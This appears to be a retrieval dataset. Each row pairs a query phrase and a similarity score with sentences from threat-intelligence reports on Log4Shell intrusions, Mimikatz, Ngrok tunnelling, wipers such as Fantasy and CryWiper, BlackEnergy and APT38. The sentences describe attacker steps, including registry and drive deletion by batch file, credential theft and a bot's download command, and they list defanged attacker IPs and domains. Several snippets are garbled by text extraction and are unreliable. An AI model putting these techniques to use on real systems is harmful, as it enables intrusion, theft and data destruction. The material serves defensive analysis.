HKCR\*"|0.7560553984390073|['This is presumably done to make recovery and forensic analysis more difficult.', 'During the for loop, the Fantasy wiper counts errors within the current directory when attempting to overwrite files.', 'If the number of errors exceeds 50, it writes a batch file, %WINDOWS%\\\\Temp\\\\<GUID>.bat, that deletes the directory with the files causing the errors, and then self-deletes.', 'File wiping then resumes in the next directory in the target list.', 'Once the for loop completes, the Fantasy wiper creates a batch file in %WINDOWS%\\\\Temp called registry.bat.', 'The batch file deletes the following registry keys: HKCR\\\\.EXE HKCR\\\\.dll HKCR\\\\* Then it runs the following to attempt to clear file system cache memory: %windir%\\\\system32\\\\rundll32.exe advapi32.dll,ProcessIdleTasks Lastly, registry.bat deletes itself (del %0).', 'Next, the Fantasy wiper clears all Windows event logs and creates another batch file, system.bat, in %WINDOWS%\\\\Temp, that recursively deletes all files on %SYSTEMDRIVE%, attempts to clear file system cache memory, and self-deletes.', 'Then Fantasy sleeps for two minutes before overwriting the systems Master Boot Record.', 'Fantasy then writes another batch file, %WINDOWS%\\\\Temp\\\\remover.bat, that deletes the Fantasy wiper from disk and then deletes itself.', 'Then Fantasy wiper sleeps for 30 seconds before rebooting the system with reason code SHTDN_REASON_MAJOR_OTHER (0x00000000) Other issue.', 'It is likely that %SYSTEMDRIVE% recovery is possible.']
The actors downloaded malware and multiple tools to the network, including PsExec, Mimikatz, and Ngrok.|0.7790189369430788|"['Other factors, such as access patterns (ex: multiple systems over a relatively short period of time) and activity that occurs after a remote login, may indicate suspicious or Page 10 of 14 | Product ID: AA22-320A TLP:CLEARTLP:CLEAR CISA | FBI `` malicious behavior with RDP [DS0028].', 'Command and Control Technique Title ID Use Recommendations Proxy T1090 The actors used Ngrok Mitigation: Traffic to known to proxy RDP anonymity networks and C2 connections and to infrastructure can be blocked perform command and through the use of network allow control.', 'and block lists [M1037].', 'Detection: Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g., extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure) [DS0029].', 'Ingress Tool T1105 The actors downloaded Mitigation: Employ anti-malware to Transfer malware and multiple automatically detect and quarantine tools to the network, malicious scripts [M1049].', 'including PsExec, Mimikatz, and Ngrok.', 'INCIDENT RESPONSE If suspected initial access or compromise is detected based on IOCs or TTPs in this CSA, CISA encourages organizations to assume lateral movement by threat actors and investigate connected systems and the DC.', 'CISA recommends organizations apply the following steps before applying any mitigations, including patching.', '1.', 'Immediately isolate affected systems.', '2.']"
the actors gained access to a VMware service account with administrator and system level access|0.8331703000499255|[']2 and removed mde.ps1 from the disk [T1070.004].', 'file.zip contained XMRig cryptocurrency mining software and associated configuration files.', 'WinRing0x64.sys XMRig Miner driver wuacltservice.exe XMRig Miner config.json XMRig miner configuration RuntimeBroker.exe Associated file.', 'This file can create a local user account [T1136.001] and tests for internet connectivity by pinging 8.8.8.8 [T1016.001].', 'The exploit payload created a Scheduled Task [T1053.005] that executed RuntimeBroker.exe daily as SYSTEM.', 'Note: By exploiting Log4Shell, the actors gained access to a VMware service account with administrator and system level access.', 'The Scheduled Task was named RuntimeBrokerService.exe to masquerade as a legitimate Windows task.', 'See MAR 10387061-1.v1 for additional information, including IOCs, on these four files.', 'After obtaining initial access and installing XMRig on the VMWare Horizon server, the actors used RDP [T1021.001] and the built-in Windows user account DefaultAccount [T1078.001] to move laterally [TA0008] to a VMware VDI-KMS host.', 'Once the threat actor established themselves on the VDI-KMS host, CISA observed the actors download around 30 megabytes of files from transfer[.', ']sh server associated with 144.76.136[.]153.']
the actors gained access to a VMware service account with administrator and system level access|0.8331703000499255|[']2/mdepoy.txt to C:\\\\users\\\\public\\\\mde.ps1 [T1105].', 'When executed, mde.ps1 downloaded file.zip from 182.54.217[.', ']2 and removed mde.ps1 from the disk [T1070.004].file.zip contained XMRig cryptocurrency mining software and associated configuration files.WinRing0x64.sys XMRig Miner driverwuacltservice.exe XMRig Minerconfig.json XMRig miner configurationRuntimeBroker.exe Associated file.', 'This file can create a local user account [T1136.001] and tests for internet connectivity by pinging 8.8.8.8 [T1016.001].', 'The exploit payload created a Scheduled Task [T1053.005] that executed RuntimeBroker.exe daily as SYSTEM.', 'Note: By exploiting Log4Shell, the actors gained access to a VMware service account with administrator and system level access.', 'The Scheduled Task was named RuntimeBrokerService.exe to masquerade as a legitimate Windows task.See MAR 10387061-1.v1 for additional information, including IOCs, on these four files.After obtaining initial access and installing XMRig on the VMWare Horizon server, the actors used RDP [T1021.001] and the built-in Windows user account DefaultAccount [T1078.001] to move laterally [TA0008] to a VMware VDI-KMS host.', 'Once the threat actor established themselves on the VDI-KMS host, CISA observed the actors download around 30 megabytes of files from transfer[.', ']sh server associated with 144.76.136[.]153.', 'The actors downloaded the following tools:PsExec a Microsoft signed tool for system administrators.Mimikatz a credential theft tool.Ngrok a reverse proxy tool for proxying an internal service out onto an Ngrok domain, which the user can then access at a randomly generated subdomain at *.ngrok[.]io.', 'CISA has observed this tool in use by some commercial products for benign purposes; however, this process bypasses typical firewall controls and may be a potentially unwanted application in production environments.']
The Scheduled Task was named to masquerade as a legitimate Windows task.|0.8111843803973912|['file.zip contained XMRig cryptocurrency mining software and associated configuration files.', 'WinRing0x64.sys XMRig Miner driver wuacltservice.exe XMRig Miner config.json XMRig miner configuration RuntimeBroker.exe Associated file.', 'This file can create a local user account [T1136.001] and tests for internet connectivity by pinging 8.8.8.8 [T1016.001].', 'The exploit payload created a Scheduled Task [T1053.005] that executed RuntimeBroker.exe daily as SYSTEM.', 'Note: By exploiting Log4Shell, the actors gained access to a VMware service account with administrator and system level access.', 'The Scheduled Task was named RuntimeBrokerService.exe to masquerade as a legitimate Windows task.', 'See MAR 10387061-1.v1 for additional information, including IOCs, on these four files.', 'After obtaining initial access and installing XMRig on the VMWare Horizon server, the actors used RDP [T1021.001] and the built-in Windows user account DefaultAccount [T1078.001] to move laterally [TA0008] to a VMware VDI-KMS host.', 'Once the threat actor established themselves on the VDI-KMS host, CISA observed the actors download around 30 megabytes of files from transfer[.', ']sh server associated with 144.76.136[.]153.', 'The actors downloaded the following tools: PsExec a Microsoft signed tool for system administrators.']
the actors used RDP|0.7584118876168581|['6/8 ID CryWiper ,      .', 'ID    , ,  ,  .', ':    ,  ID    .', ', CryWiper  , ,         .', 'CryWiper      CryWiper  ,   .', '.', 'CryWiper   IsaaWiper   ,    .', '.', ',   ,  :    (, MD5: 4A42F739CE694DB7B3CDD3C233CE7FB1, 71D9E6EE26D46C4DBB3D8E6DF19DDA7D, 0C6D33DA653230F56A7168E73F1448AC).', '-  Trojan-Ransom.Win32.Xorist,     Trojan-Ransom.MSIL.Agent.', ',  ,  2017 .']
the actors used RDP|0.7584118876168581|['CryWiper ,    ,  .', '.exe C:\\\\Windows .dll tmp .lnk winnt .sys temp .msi thumb .CRY System Volume Information Boot Windows Trend Micro    .CRY.', '5/8 ,  .', ',       IsaacWiper.', ',    .', ',    .', ', IsaacWiper    , CryWiper,   ,   .', ',  CryWiper    README.txt  .', ',   Bitcoin-  ,    ID .', '6/8 ID CryWiper ,      .', 'ID    , ,  ,  .']
the actors used RDP|0.7584118876168581|['-    -   .', 'Hi-Tech Crime Trends         ,  - ,  .', 'Hi-Tech Crime Trends  -,  - , SOC-,   ,      .', 'Hi-Tech Crime Trends  -   ,     ,  .', 'Group-IB  ,  ,    -    -   .', '.', 'Group-IB:  ,  ,   Leaks  ,  ,      ,  ,  ,  Group-IB   ,  ,     ,   ,   ,   GROUP-IB.RU  6   Group-IB    Hi-Tech Crime Trends,              .', ': Group-IB Threat Intelligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB            , ,  - .', ',   Group-IB    ,     .', ', - -   .']
the actors leveraged RDP to propagate to several hosts within the network.|0.8514542455465381|"['Mimikatz a credential theft tool.', 'Ngrok a reverse proxy tool for proxying an internal service out onto an Ngrok domain, which the user can then access at a randomly generated subdomain at *.ngrok[.]io.', 'CISA has observed this tool in use by some commercial products for benign purposes; however, this process bypasses typical firewall controls and may be a potentially unwanted application in production environments.', 'Ngrok is known to be used for malicious purposes.', '[1] The threat actors then executed Mimikatz on VDI-KMS to harvest credentials and created a rogue domain administrator account [T1136.002].', 'Using the newly created account, the actors leveraged RDP to propagate to several hosts within the network.', 'Upon logging into each host, the actors manually disabled Windows Defender via the Graphical User Interface (GUI) and implanted Ngrok executables and configuration files.', 'The threat actors were able to implant Ngrok on multiple hosts to ensure Ngroks persistence should they lose access to a machine during a routine reboot.', 'The actors were able to proxy [T1090] RDP sessions, which were only observable on the local network as outgoing HTTPS port 443 connections to tunnel.us.ngrok[.', ']com and korgn.su.lennut[.', ']com Page 3 o f 14 | Product ID: AA22-320A TLP:CLEARTLP:CLEAR CISA | FBI `` (the prior domain in reverse).']"
the actors leveraged RDP to propagate to several hosts within the network.|0.8514542455465381|[']sh server associated with 144.76.136[.]153.', 'The actors downloaded the following tools:PsExec a Microsoft signed tool for system administrators.Mimikatz a credential theft tool.Ngrok a reverse proxy tool for proxying an internal service out onto an Ngrok domain, which the user can then access at a randomly generated subdomain at *.ngrok[.]io.', 'CISA has observed this tool in use by some commercial products for benign purposes; however, this process bypasses typical firewall controls and may be a potentially unwanted application in production environments.', 'Ngrok is known to be used for malicious purposes.', '[1]The threat actors then executed Mimikatz on VDI-KMS to harvest credentials and created a rogue domain administrator account [T1136.002].', 'Using the newly created account, the actors leveraged RDP to propagate to several hosts within the network.', 'Upon logging into each host, the actors manually disabled Windows Defender via the Graphical User Interface (GUI) and implanted Ngrok executables and configuration files.', 'The threat actors were able to implant Ngrok on multiple hosts to ensure Ngroks persistence should they lose access to a machine during a routine reboot.', 'The actors were able to proxy [T1090] RDP sessions, which were only observable on the local network as outgoing HTTPS port 443 connections to tunnel.us.ngrok[.', ']com and korgn.su.lennut[.', ']com (the prior domain in reverse).']
Mimikatz – a credential theft tool.|1.0|['See MAR 10387061-1.v1 for additional information, including IOCs, on these four files.', 'After obtaining initial access and installing XMRig on the VMWare Horizon server, the actors used RDP [T1021.001] and the built-in Windows user account DefaultAccount [T1078.001] to move laterally [TA0008] to a VMware VDI-KMS host.', 'Once the threat actor established themselves on the VDI-KMS host, CISA observed the actors download around 30 megabytes of files from transfer[.', ']sh server associated with 144.76.136[.]153.', 'The actors downloaded the following tools: PsExec a Microsoft signed tool for system administrators.', 'Mimikatz a credential theft tool.', 'Ngrok a reverse proxy tool for proxying an internal service out onto an Ngrok domain, which the user can then access at a randomly generated subdomain at *.ngrok[.]io.', 'CISA has observed this tool in use by some commercial products for benign purposes; however, this process bypasses typical firewall controls and may be a potentially unwanted application in production environments.', 'Ngrok is known to be used for malicious purposes.', '[1] The threat actors then executed Mimikatz on VDI-KMS to harvest credentials and created a rogue domain administrator account [T1136.002].', 'Using the newly created account, the actors leveraged RDP to propagate to several hosts within the network.']
The threat actors then executed Mimikatz on VDI-KMS to harvest credentials|0.7566168451821701|"['Test your technologies against the technique.', '4.', 'Analyze your detection and prevention technologies performance.', '5.', 'Repeat the process for all security technologies to obtain a set of comprehensive performance data.', '6.', 'Tune your security program, including people, processes, and technologies, based on the data generated by this process.', 'CISA and FBI recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.', 'REFERENCES [1] MITRE ATT&CK Version 12: Software Ngrok Page 14 of 14 | Product ID: AA22-320A TLP:CLEAR']"
The threat actors then executed Mimikatz on VDI-KMS to harvest credentials|0.7566168451821701|['Once the threat actor established themselves on the VDI-KMS host, CISA observed the actors download around 30 megabytes of files from transfer[.', ']sh server associated with 144.76.136[.]153.', 'The actors downloaded the following tools:PsExec a Microsoft signed tool for system administrators.Mimikatz a credential theft tool.Ngrok a reverse proxy tool for proxying an internal service out onto an Ngrok domain, which the user can then access at a randomly generated subdomain at *.ngrok[.]io.', 'CISA has observed this tool in use by some commercial products for benign purposes; however, this process bypasses typical firewall controls and may be a potentially unwanted application in production environments.', 'Ngrok is known to be used for malicious purposes.', '[1]The threat actors then executed Mimikatz on VDI-KMS to harvest credentials and created a rogue domain administrator account [T1136.002].', 'Using the newly created account, the actors leveraged RDP to propagate to several hosts within the network.', 'Upon logging into each host, the actors manually disabled Windows Defender via the Graphical User Interface (GUI) and implanted Ngrok executables and configuration files.', 'The threat actors were able to implant Ngrok on multiple hosts to ensure Ngroks persistence should they lose access to a machine during a routine reboot.', 'The actors were able to proxy [T1090] RDP sessions, which were only observable on the local network as outgoing HTTPS port 443 connections to tunnel.us.ngrok[.', ']com and korgn.su.lennut[.']
The actors used Mimikatz|0.7701843164576297|['-    -   .', 'Hi-Tech Crime Trends         ,  - ,  .', 'Hi-Tech Crime Trends  -,  - , SOC-,   ,      .', 'Hi-Tech Crime Trends  -   ,     ,  .', 'Group-IB  ,  ,    -    -   .', '.', 'Group-IB:  ,  ,   Leaks  ,  ,      ,  ,  ,  Group-IB   ,  ,     ,   ,   ,   GROUP-IB.RU  6   Group-IB    Hi-Tech Crime Trends,              .', ': Group-IB Threat Intelligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB            , ,  - .', ',   Group-IB    ,     .', ', - -   .']
login credentials|0.7617481371694231|"['Knowing the PID of the parent process powershell.exe, we analyze events 4103 and 4104 (Microsoft-Windows-PowerShell log) and detect the file download using the Invoke-WebRequest cmdlet.', 'We also see that the command was run under the user r_flores_admin.181 eht rof tneve daolnwoD .5 erugiF exe.detcirtserkrowtensysl elfi Our focus now is the user r_flores_admin.', 'We perform the same trick as before, that is, analyze where, how, and when the login was made under this user.', 'It turns out that it was again an RDP session from the host rdg.hv-logistivs.stf (10.156.26.21).', ""But let's not race ahead."", 'Before investigating what happened on this host, we first take a look at the actual login.', 'From this event, we can extract extremely useful information: the session ID.', 'This will allow us to collect all user activity related to this RDP session, which can help with incident response.', 'We can look at the processes running within the session, and find possible artifacts of attacker activity and potential ways to gain persistence in the system.', 'Figure 6.', 'Installing a service on comp-54.hv- logistics.stf (10.156.22.25) to elevate privileges and gain persistence in the systemDuring this session, as we discovered, Because attackers sometimes forget (or are r_flores_admin created a service with the execut- too lazy) to change this line, it can be a great able file WWIHost.exe to elevate their privileges indicator of using Impacket smbexec.']"
login credentials|0.756704906212075|['As we noted then, these incidents stood out because they exceeded the level of care and preparation seen in the everyday cybercrime.', 'In our report, we also noted a similarity to the Operation Kingphish (http://medium.com/amnesty-insights/operation-kingphish- uncovering-a-campaign-of-cyber-attacks-against-civil-society-in-qatar-and-aa40c9e08852) campaign published by Amnesty International earlier this year.', 'As we wrote then, compared to Kingphish, Bahamut operates as though it were a generation ahead in terms of professionalism and ambition.', 'A more recent credential theft attempt provided the most credible link between the two campaigns thus far, and bolsters our hypothesis that the operations are related.', 'Among a flurry of spearphishing attempts associated with Bahamut in recent weeks, one fake Google message directed its target to a unique domain (string2port[.', ']com) to steal login credentials.', 'The string2port domain (registered in May 2016) strongly reflects the ping2port[.', ']info domain (registered in September 2016) that was used in Kingphish against Qatar-focused labor rights advocates.', 'The ping2port domain is now pending deletion abandoned due to discovery but the previously unnoticed and related string2port has been reused.', 'Given the similarities in tactics, administration of infrastructure, domains, and other factors, it appears increasingly clear both campaigns against Middle Eastern diplomats and those directed against human rights advocates are connected.', 'The similarities to other research is not limited to Kingphish, and includes a prolific campaign in South Asia.']
login credentials|0.756704906212075|['After unpacking the larger targeting of the attacks, the credential theft operations were found to cover a broad range of interests in the Middle East, such as Turkish diplomats and Iranian political figures in the lead up to the recent presidential election.', 'As we noted then, these incidents stood out because they exceeded the level of care and preparation seen in the everyday cybercrime.', 'In our report, we also noted a similarity to theOperation Kingphishcampaign published by Amnesty International earlier this year.', 'As we wrote then, compared to Kingphish, Bahamut operates as though it were a generation ahead in terms of professionalism and ambition.A more recent credential theft attempt provided the most credible link between the two campaigns thus far, and bolsters our hypothesis that the operations are related.', 'Among a flurry of spearphishing attempts associated with Bahamut in recent weeks, one fake Google message directed its target to a unique domain (string2port[.', ']com) to steal login credentials.', 'The string2port domain (registered in May 2016) strongly reflects the ping2port[.', ']info domain (registered in September 2016) that was used in Kingphish against Qatar-focused labor rights advocates.', 'The ping2port domain is now pending deletion abandoned due to discovery but the previously unnoticed and related string2port has been reused.', 'Given the similarities in tactics, administration of infrastructure, domains, and other factors, it appears increasingly clear both campaigns against Middle Eastern diplomats and those directed against human rights advocates are connected.The similarities to other research is not limited to Kingphish, and includes a prolific campaign in South Asia.', 'In our original post we noted that an expansive operation was evident from a search of potential domains based on common pattern in domain registration and hosting behavior (an Anglo-European name sometimes followed by a number at mail.ru, often also found in the DNS Start of Authority record).']
credentials|1.0|['It is, however, unconfirmed Malicious Legitimate whether the domain update.alyac.org resolved to CDN CDN the South Korean IP address at the time of the attack.', '(ESTsoft, 2011) (Samsung IDC, 2011) (ETnews, 2011) Between 18 July 2011 and 25 July 2011, the 1.', 'Attacker modifies the ALZip update server.', 'attackers used the infected computers to collect 2.', 'Computers check for ALZipsoftwareupdates and are additional internal access information and database redirected to a Content Delivery Network (CDN).', 'credentials.', 'They presumably used a file named 3.', 'Nontargeted computers download alegitimate x.exe17to acquire some of this information, after update from the ESTsoft CDN.', 'Targeted computers download a trojaned update from the attackers downloading it onto infected computers from a malicious CDN.', 'toolbox they had earlier set up.', 'Based on the behaviour of this file, the attackers likely used it to FIGURE1DEPICTIONOFHOWTHEALZIPUPDATE conduct network enumeration and to obtain SERVERWASUSEDINTHEATTACK This specific targeting of SK Communications indicates the targeting wasnt purely opportunistic.']
credentials|1.0|['counsel, and investment of public companies.', 'email correspondence.', 'common investor and They also have banking.', 'Approximately shareholder concerns, mechanisms to organize two-thirds of the enticing the intended the data they collect targeted organizations victims into opening the and have taken steps to are healthcare and weaponized document evade detection.', 'pharmaceutical and entering their email companies.', 'credentials.', '3 fireeye.comHacking the Street?', 'FIN4 Likely Playing the Market APPLYING WALL STREET KNOW-HOW: FIN4S TARGETS F ireEye believes FIN4 intentionally targets In order to get useful inside information, FIN4 individuals who have inside information compromises the email accounts of individuals about impending market catalystsevents who regularly communicate about market- that will cause the price of stocks to rise or fall moving, non-public matters.', 'substantially in a short period of time.', 'Since at least mid-2013, FIN4 has pursued targets at FIN4 frequently targets: more than 100 organizations, over two-thirds of which are public healthcare and pharmaceutical C-level executives and senior leadership companies.', 'The remaining targets include Legal counsel advisory firms that represent public companies Regulatory, risk, and compliance personnel and a handful of public companies in other Researchers sectors closely followed by market watchers.']
credentials|1.0|"['It used the format, /apps/A[3 nums]X/[COMPUTERNAME_USERNAME] where A[3 nums]X represents a particular subcampaign while /[COMPUTERNAME_USERNAME] identifies a unique victim.', 'The three digits in the folder format seem to indicate the month of the year, as they ranged from 001 to 012.', 'Further analysis of the dates when the data was stolen, however, disproved that theory.', 'An exhaustive analysis of every file on the server is beyond the scope of this paper but the details of the most interesting components are: 9 | Page 2015 Trend Micro IncorporatedOperation Arid Viper Research Paper /apps/A[3 nums]X/ison.on: This refers to FileList.txt: List of files in a directory the last time stolen data was uploaded in on an infected system, frequently the format, dd-mm-yyyy-hh-mm-ss.', 'where the malware was executed.', '/apps/A[3 nums]X/data/: This contains pdata.txt: List of stolen website login screenshots taken from infected systems, credentials.', 'along with the following files, the presence webrowser.txt: List of stolen web of which varied from victim to victim: browser credentials.', 'allips.txt: Contains victims local and wifi.txt: List of stolen Wi-Fi connection external IP addresses.', 'credentials.', 'CurrentProcess.txt: List of running workdata.txt: Contains the infection processes on infected systems.', 'date, OS, user domain name, cmpinf.txt: Contains the infection username, and a line labeled APP_ date, OS, user domain name, and PATH=, which indicates which directory username.']"
credentials|1.0|"['other brands (some legitimate and some that are likely fictitious Potentially harmful domain registrations and typosquats can businesses).', 'Domain registrations and typosquats can enable enable spearphishing campaigns or redirects that pose an spearphishing campaigns or redirects that pose a threat to victim elevated risk to a companys brand or employees.', 'A successful networks and brands.', 'spearphish is dependent on factors such as the quality of the Using a combination of proactive adversary infrastructure message, the credibility of the sender address, and, in the case detections, domain analysis techniques, and Recorded Future of a redirecting URL, the credibility of the domain name.', 'Insikt Network Traffic Analysis, we have determined that NOBELIUMs Group has previously observed other Russian nexus groups using use of SOLARDEFLECTION infrastructure overlaps with other typosquatting in support of operations, such as those aimed common infrastructure tactics, techniques, and procedures at the 2020 presidential elections, to increase confidence in (TTPs) previously attributed to the group by multiple the validity of the fraudulent login portal used to harvest victim organizations including Microsoft, Fortinet, Sekoia, and Volexity.', 'credentials.', 'This tactic has also been reported recently in Previous open source reporting also highlighted NOBELIUMs use open sources in connection with intrusions targeting entities in of cracked versions of the Cobalt Strike penetration testing tool.', 'Ukraine, likely in support of Russias invasion of the country.', '1 CTA-2022-0503 Recorded Future | www.recordedfuture.comCYBER THREAT ANALYSIS Figure 1: SOLARDEFLECTION Domain Registration reference in the Recorded Future Platform (Source: Recorded Future) Insikt Group assesses that NOBELIUM is a threat activity The Recorded Future Platform automatically detects group operating in line with the objectives of Russias Foreign typosquatted domains; each newly created domain entity is Intelligence Service (SVR).', 'The SVR is tasked with providing the evaluated for typosquatting-style similarity to other domains president of the Russian Federation, the Federal Assembly, and observed by Recorded Future.', 'An example of this is the the government with the intelligence they need to make decisions SOLARDEFLECTION typosquat displayed in Figure 1, which in the areas of politics, the economy, military strategy, scientific- based on the domains spelling was very likely an attempt by technical strategy, and the environment.']"
credentials|0.9641769525878765|['It (key HKLM\\\\Software\\\\JavaSoft, value Supplement) and also collects information about visited websites, starts the malware using the duplicated process token.', 'i.e., browsing history.', 'Cosmu copies itself with a couple of different filenames Firefox to %WINDIR%\\\\system32.', 'The binaries on the disk have a Cosmu steals saved credentials and the associated variable length of zero-padding but they are all essentially URLs from Firefox.', 'The malware does not decrypt copies of the original malware binary.', 'the credentials.', 'The filenames for both the Cosmu copies and the service y Email clients binary are generated by randomly taking two items from Thunderbird the following list and concatenating them, resulting in Cosmu steals saved credentials and the associated filenames like usbmon.exe, urllsa.exe, and rasdns.exe: mail server hostnames from Thunderbird.', 'The y nt y fw y env malware does not decrypt the credentials.', 'y inf y pc y lib Bat email client y svc y ctf y udf Cosmu steals credentials from Bat email client y ras y mon y wm by parsing account.cfn and decrypting the y pptp y pdb y win credentials.', 'y obj y ms y id y net y cpl y wdm Outlook Express y host y sys y mgr Cosmu steals saved credentials and information y lsa y ui about the associated mail server from Outlook y cms y schd Express.', 'y dsp y tapi Outlook y sql y eng Cosmu steals saved credentials and information y dhcp y cfg about the associated mail server from Outlook.']
keystrokes|0.7561178453986401|['properly restricted and assigned to only those who require them.', 'STEP 7: HARVEST CREDENTIALS Delivered BlackEnergy 3 malware plugins conduct STEP 8: LATERAL MOVEMENT credential harvesting and network discovery AND TARGET IDENTIFICATION ON functions.', 'CORPORATE NETWORK Threat actors conduct internal reconnaissance on Location: Corporate network the corporate network to discover potential targets Action: Active threat actor activity, malware and expand access.', 'execution Location: Corporate network Timeline: June 2015December 2015 Action: Active threat actor activity, malware Device/application: Windows OS workstations, execution Windows domain controllers, virtual private Timeline: June 2015December 2015 network (VPN) service deployed in control environment Device/application: Discovered systems, including networked uninterruptable power Role in infrastructure: These systems support supply (UPS) devices, data center servers, business operations, manage permissions and a telephone communications server, and domain access, and provide remote network employee workstations access respectively.', 'Role in infrastructure: Internal reconnaissance Exploitation method: Threat actors use delivered efforts could potentially include all deployed BlackEnergy 3 plugins to gather stored credentials devices on the corporate network.', 'or log keystrokes.', 'After gathering valid credentials for user with administrator privileges, threat actors Exploitation method: Threat actors likely use a use the stolen administrator credentials to access combination of valid user credentials and the domain controller, recover additional creden- BlackEnergy 3 plugins developed to conduct tials, and create new privileged accounts.', 'network discovery.', 'VS.dll plugin is likely used to leverage MS Sysinternals PsExec to establish Impact: Threat actors obtain valid credentials remote connections to workstations and servers.', 'enabling them to expand access across the corporate network and into the control environment, Impact: Threat actors are able to enumerate the ensure persistent access, and blend into regular systems deployed across the network, identify network traffic.', 'targets, and begin preparations for final attack.']
operating system information|0.8798667009153172|"['These domains include is to create.', ""In this instance, the configured named bbs.afbjz.com', newhose.ntimobile.com', and was winsvcfs.dll, as shown in Figure 2."", ""Due to the www.adv138mail.com'32."", 'namebeing configurable, theRAT willnot alwaysbe called winsvcfs.dll.', 'The configuration block also The RAT has many different capabilities and contains a callback domain and port for the runs onmultipleversionsoftheMicrosoft Windows malwares command and control communications.', 'operating system.', ""The RAT's behaviour changes The callback domain is configured to be slightly depending onwhichversionof theWindows nateon.duamlive.com and the port is configured to operating system it is installed on and which be80 (50inhexadecimal), also showninFigure2."", 'modules are installed.', 'Modules used by the RAT deployed to the SK Communications network If no configuration is specified, the malware include: uses default values instead.', 'The default callback location hardcoded into the malware is the private IP address, 192.168.0.200.', 'This address is not 28Theprocesssvchost.exe is agenerichostprocessforservices 31 Symantec antivirus software detects nateon.exe as which runfromDLLs.']"
system information,|1.0|"['impactful users, based on the level of risk to the frequently trigger investigations by security security violation or a potential security violation.', 'organization if they become compromised.', 'operations/analysts.', 'authorization attack surface A process of determining whether a subject is botnet analyst An information systems characteristics that permit allowed to have the specified types of access to a A collection of computers compromised by Also known as cybersecurity analyst, a common role an adversary to probe, attack, or maintain presence particular resource.', 'This action is typically done by malicious code and controlled across a network.', 'within an organizations SOC team that investigates, in the information system.', 'evaluating applicable access control information alerts, or hunts for adversary activities.', 'such as access control lists.', 'In modern cybersecurity approaches, authorization could also incorporate other risk factors such as behavioral analytics and evaluation of threat intelligence.', 'Microsoft Digital Defense Report | September 2020 83TABLE OF CONTENTS INTRODUCTION THE STATE OF CYBERCRIME NATION STATE THREATS SECURITY AND THE REMOTE WORKFORCE ACTIONABLE LEARNINGS GLOSSARY breach ciphertext data estate encryption Any incident that results in unauthorized access of Data or information in its encrypted form used The procedures, services, and infrastructure used to The process of transforming plaintext into data, applications, services, networks, and/or devices primarily by cryptology experts.', 'Sometimes referred manage corporate data in the digital estate.']"
downloading|0.8618341953286025|"['""ERR:1"" the number of parameters #wget Bot accepts two parameters: URL and is not equal to 3. hp://www.', 'file name.', 'When /d flag is present, does constitution.', '""Save/Get failed"" error while nothing.', 'Changes date and time of file org/usdeclar.', 'downloading the file.', 'creation, last access, and last change to txt text.txt the date from the similar field ""kernel32.', '""Saved"" the file is downloaded and dll"".', 'saved #ver Get the bot version.', '""0.2.21.0001_srv_i86"" #ver #p Refresh time of the last response/call to No response #p the server.', 'The command is meaningless because refreshing is automated and happens upon receiving/accepting the message from the server.']"
evade detection|1.0000000000000002|"['This coincides with and financial entities since at least 20141.', ""In late 2015, APT38's targeting of organizations in Southeast Asia, their operations escalated as they attempted to conduct including entities located in Vietnam, Malaysia, and the fraudulent transactions for the first time."", 'Throughout 2016, Philippines throughout 2016.', 'The DOJ complaint also APT38 pursued geographically diverse targets at a notable detailed adversary use of a shared password between rate.', 'While APT38 is financially motivated, we believe Bangladesh Bank, the African bank and Southeast Asian that in certain instances, they targeted entities solely for bank, providing evidence of further TTP overlap with infrastructure to facilitate follow-on operations or help APT38.', 'evade detection.', 'Per public reporting, threat actors targeted Banco del During our review, multiple public incidents have been Austro in Ecuador with fraudulent SWIFT transactions reportedly linked to this body of activity based largely in 2015.', 'While we have limited insight into this targeting, on their targeting of SWIFT systems.', 'We are currently we have identified APT38 targeting South American tracking a variety of suspected events that have varying entities previously.', 'degrees of associations to APT38.', 'Although we cannot In August 2018, threat actors targeted Cosmos confirm these instances were conducted by APT38, we Bank in India using both fraudulent ATM and SWIFT have observed some overlaps between these publicly transactions.']"
evade detection|0.7985896494415962|['These threat actors while others impersonated messages from WhatsApp.', 'have experimented with a number of cloud platforms, including Google Cloud, Amazon AWS, Microsoft Azure PINEAPPLE varied their techniques to convince and others.', 'email gateways their emails were authentic - for example, using mail forwarding services, which do Their abuse of serverless computing resources dates not drop messages with failed SPF records, or placing back to at least 2019 when security researchers Return-Path unexpected data in the SMTP field to observed them using Cloudflare Workers to create trigger a DNS request timeout and cause SPF email randomized URLs to prevent automated analysis and authentication checks to fail.', 'deliver a malicious payload.', 'Based in Latin America, the distributors of the Astaroth infostealer primarily When we detected PINEAPPLE abusing Cloud Run target users in Brazil, and are well known for their and Cloud Functions, teams across Google worked ability to quickly update their malware and distribution together to hunt and disrupt related activity.', 'We techniques to evade detection.', 'updated detection signatures and implemented mitigation measures that significantly reduced the In mid-2023, TAG and Safe Browsing detected Google volume of the Astaroth campaigns by 99% compared Cloud abuse by actors we track as PINEAPPLE, to the campaigns peak.', 'who leveraged Cloud Run and Cloud Functions to distribute the Astaroth infostealer.', 'PINEAPPLE used As our teams discovered new abuse attempts, compromised Google Cloud instances and Google Safe Browsing and TAG updated signatures and Cloud projects they created themselves to create created tailored detections to identify and block the container URLs on legitimate Google Cloud serverless campaigns.', 'We also added malicious URLs to the Safe cloudfunctions.net domains such as and Browsing blocklist.', 'Google disabled the malicious run.app .']
anti-virus software information|0.8380160414276764|['Create a lnk file named xBoxOne.lnk in the temporary directory.', 'This file requests the execution of a remote script file.', 'The URL address is hxxps: //bit [.]', 'ly/2xMHylE.', 'Then move the file to the startup directory for persistent residency.', 'c. Anti-virus software detection.d.', 'Decrypt and release the file named qjqykntc.vbs to the users temporary directory, and then execute it.', 'Anti-virus software detection is as follows, traversing the current system process through the wmi interface.', 'If a kwsprot process (Kingsoft AntiVirus) or npprot process (NPAV anti-virus protection) is detected, use cscript.exe to execute subsequent landing vbscript; otherwise use wscript.exe engine (It is conjectured that its for dynamic kill-free processing).', 'Then proceed to find the name of the Anti-virus software process.', 'If a process containing hudongf (360 active defense) or a qhsafe process (360 Anti-virus software components) is detected, the lnk file created in the temporary directory is deleted; otherwise, the normal execution is performed.']
